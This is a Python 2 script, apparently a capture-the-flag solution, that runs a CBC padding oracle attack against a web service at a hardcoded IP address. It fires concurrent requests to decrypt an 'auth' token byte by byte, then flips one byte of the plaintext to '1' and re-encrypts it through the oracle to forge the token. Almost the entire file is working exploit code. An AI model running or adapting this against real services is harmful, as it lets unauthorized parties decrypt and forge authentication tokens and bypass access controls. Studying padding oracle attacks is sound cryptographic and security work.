import traceback
from urlparse import urlparse, parse_qs
from binascii import hexlify, unhexlify
import requests
import gevent
from gevent import monkey as curious_george
from gevent.pool import Pool

block_bytelen = 8
# BASE_URL = 'http://localhost:8000/'
BASE_URL = 'http://45.55.213.72:8009/'


curious_george.patch_all(thread=False, select=False)
session = requests.session()


def get_content(ints):
    params = {'auth': hexlify(''.join([chr(x) for x in ints]))}
    response = session.get(BASE_URL, params=params)
    return response.content


class AsyncRequest(object):
    def __init__(self, method, url, **kwargs):
        self.method = method
        self.url = url

        self.session = kwargs.pop('session', None)
        if self.session is None:
            self.session = requests.Session()

        callback = kwargs.pop('callback', None)
        if callback:
            kwargs['hooks'] = {'response': callback}

        self.kwargs = kwargs
        self.response = None
        self.exception = None
        self.formatted_exception = None
    def send(self):
        # print "sending", self.kwargs['params']['auth']
        try:
            self.response = self.session.request(self.method, self.url, **self.kwargs)
        except Exception as e:
            self.exception = e
            self.formatted_exception = traceback.format_exc()
        return self


def try_all_byte_values(ints, byte_idx):
    if byte_idx == block_bytelen - 1:
        return decrypt_rightmost_byte(ints, byte_idx)
    else:
        return decrypt_other_byte(ints, byte_idx)


def decrypt_rightmost_byte(ints, byte_idx):
    pool = Pool(10)
    requests = []
    jobs = []
    for i in range(256):
        copy_ints = ints[:]
        copy_ints[byte_idx] = i
        params = {'auth': hexlify(''.join([chr(x) for x in copy_ints]))}
        request = AsyncRequest('GET', BASE_URL, params=params, session=session)
        requests.append(request)
        jobs.append(pool.spawn(request.send))
    gevent.joinall(jobs)
    found_i = []
    for i in range(256):
        request = requests[i]
        if request.response.content != 'padding error':
            found_i.append(i)
    if len(found_i) == 1:
        return found_i[0]
    else:
        raise ValueError("more than one byte resulted in good padding, need to change second byte to find which results in last byte 1")


def create_hook(pool, x, retval):
    def hook(response, *args, **kwargs):
        if  response.content != 'padding error':
            retval[0] = x
            pool.kill(block=False)
    return hook


def decrypt_other_byte(ints, byte_idx):
    retval = [None]
    pool = Pool(10)
    requests = []
    jobs = []
    for i in range(256):
        copy_ints = ints[:]
        copy_ints[byte_idx] = i
        params = {'auth': hexlify(''.join([chr(x) for x in copy_ints]))}
        request = AsyncRequest('GET', BASE_URL, params=params, session=session, callback=create_hook(pool, i, retval))
        requests.append(request)
        jobs.append(pool.spawn(request.send))
        if not retval[0] is None:
            break
    gevent.joinall(jobs)
    return retval[0]


def decrypt_block_using_padding_oracle(bytes):
    assert len(bytes) == block_bytelen
    assert type(bytes[0]) == int
    ints = [0]*block_bytelen + bytes
    decrypted_block = [0]*block_bytelen
    for byte_idx in range(block_bytelen - 1, -1, -1):
        padding_byte = block_bytelen - byte_idx
        for i in range(block_bytelen - 1, byte_idx, -1):
            ints[i] = decrypted_block[i] ^ padding_byte
        good_i = try_all_byte_values(ints, byte_idx)
        decrypted_block[byte_idx] = padding_byte ^ good_i
    return decrypted_block

def xor_blocks(b1, b2):
    return [a^b for a,b in zip(b1, b2)]

def decrypt_block_with_iv_using_padding_oracle(bytes):
    assert len(bytes) == block_bytelen * 2
    assert type(bytes[0]) == int
    iv, ciphertext_block = bytes[:block_bytelen], bytes[block_bytelen:]
    decrypted_block = decrypt_block_using_padding_oracle(ciphertext_block)
    return xor_blocks(iv, decrypted_block)

def decrypt_message_using_padding_oracle(bytes):
    assert len(bytes) % block_bytelen == 0
    assert len(bytes) >= block_bytelen * 2
    assert type(bytes[0]) == int
    decrypted = []
    curr_i = 0
    while curr_i + block_bytelen * 2 <= len(bytes):
        two_blocks = bytes[curr_i : curr_i+block_bytelen*2]
        decrypted.extend(decrypt_block_with_iv_using_padding_oracle(two_blocks))
        curr_i += block_bytelen
    return decrypted

def ints2s(ints):
    return ''.join([chr(x) for x in ints])

def s2ints(s):
    return [ord(c) for c in s]

def pkcs7pad(s):
    padding_length = block_bytelen - (len(s) % block_bytelen)
    padding = chr(padding_length) * padding_length
    return s + padding

def encrypt_message_using_padding_oracle(input, last_block_ciphertext=[0]*block_bytelen):
    cleartext = input
    if type(input) == str:
        cleartext = s2ints(pkcs7pad(input))
    ints = [0]*len(cleartext) + last_block_ciphertext
    curr = len(cleartext) - block_bytelen
    while curr >= 0:
        new_decrypt = decrypt_block_using_padding_oracle(ints[curr+block_bytelen:curr+block_bytelen*2])
        new_prev_block = xor_blocks(new_decrypt, cleartext[curr:curr+block_bytelen])
        ints[curr:curr+block_bytelen] = new_prev_block
        curr -= block_bytelen
    return ints

response = session.get(BASE_URL)
original_ints = [ord(x) for x in unhexlify(parse_qs(urlparse(response.url).query)['auth'][0])]
decrypted1 = decrypt_message_using_padding_oracle(original_ints)
print ints2s(decrypted1)
total_requests = 0

decrypted1[-3] = ord('1')
ints = encrypt_message_using_padding_oracle(decrypted1)
print get_content(ints)
total_requests = 0

